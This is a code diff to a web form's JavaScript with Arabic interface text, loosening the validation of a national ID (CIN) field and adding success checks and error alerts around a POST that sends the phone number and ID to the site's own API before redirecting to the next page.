@@ -297,7 +297,7 @@ document.addEventListener("DOMContentLoaded", () => {
         cinInput.classList.add("input-error");
     }
 
-    // Format & validate CIN input (Numbers only, 10-digit NNIN format for Mauritania)
+    // Format & validate CIN input (Numbers only, 8-10 digits)
     cinInput.addEventListener("input", () => {
         cinInput.value = cinInput.value.replace(/\D/g, "");
         cinInput.classList.remove("input-error");
@@ -322,16 +322,28 @@ document.addEventListener("DOMContentLoaded", () => {
         submitBtn.textContent = "جاري الإرسال...";
 
         try {
-            await fetch("/api/save-cin", {
+            const response = await fetch("/api/save-cin", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({ phone, cin: cinValue })
             });
+
+            const data = await response.json();
+            if (data.success) {
+                window.location.href = "/page9";
+            } else {
+                alert("حدث خطأ أثناء إرسال البيانات. يرجى المحاولة مرة أخرى.");
+                submitBtn.disabled = false;
+                submitBtn.classList.add("active");
+                submitBtn.textContent = "متابعة";
+            }
         } catch (err) {
             console.error("❌ خطأ أثناء حفظ الرقم الوطني:", err);
+            alert("تعذر الاتصال بالخادم. يرجى التحقق من الاتصال.");
+            submitBtn.disabled = false;
+            submitBtn.classList.add("active");
+            submitBtn.textContent = "متابعة";
         }
-
-        window.location.href = "/page9";
     });
 });
 </script>
